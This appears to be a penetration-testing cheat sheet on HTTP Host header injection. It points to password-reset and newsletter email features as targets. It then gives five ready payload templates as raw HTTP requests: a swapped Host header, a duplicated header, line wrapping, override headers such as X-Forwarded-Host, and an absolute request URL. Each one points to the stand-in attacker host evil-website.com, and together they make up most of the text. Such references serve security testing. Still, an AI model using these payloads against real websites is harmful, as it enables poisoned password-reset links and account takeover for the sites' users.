# Host Header Injection

## Introduction
HTTP Host header attacks exploit vulnerable websites that handle the value of the Host header in an unsafe way. If the server implicitly trusts the Host header, and fails to validate or escape it properly, an attacker may be able to use this input to inject harmful payloads that manipulate server-side behavior. Attacks that involve injecting a payload directly into the Host header are often known as "Host header injection" attacks.

## Where to find
In the feature where the website can send email to us. For example forgot password / newsletter.

## How to exploit
1. Change the host header
```
GET /index.php HTTP/1.1
Host: evil-website.com
...
```
2. Duplicating the host header
```
GET /index.php HTTP/1.1
Host: vulnerable-website.com
Host: evil-website.com
...
```
3. Add line wrapping
```
GET /index.php HTTP/1.1
 Host: vulnerable-website.com
Host: evil-website.com
...
```
4. Add host override headers
```
X-Forwarded-For : evil-website.com
X-Forwarded-Host : evil-website.com
X-Client-IP : evil-website.com
X-Remote-IP : evil-website.com
X-Remote-Addr : evil-website.com
X-Host : evil-website.com
```
How to use? In this case im using "X-Forwarded-For : evil.com"
```
GET /index.php HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-For : evil-website.com
...
```
5. Supply an absolute URL
```
GET https://vulnerable-website.com/ HTTP/1.1
Host: evil-website.com
...
```
